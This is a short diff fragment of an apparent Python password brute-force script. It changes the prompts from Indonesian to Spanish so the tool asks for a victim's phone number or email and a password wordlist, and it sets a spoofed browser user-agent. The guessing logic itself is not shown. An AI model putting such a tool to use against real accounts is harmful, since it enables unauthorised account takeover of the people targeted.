@@ -28,8 +28,8 @@ print(("""
 
 
 
-email = input("[*]=> Masukan ID KorbanNYA COK : ")
-passwordlist = input("List Password.txt : ")
+email = str(raw_input("telefono o correo de la victima : "))
+passwordlist = str(raw_input("wordlist : "))
 
 useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
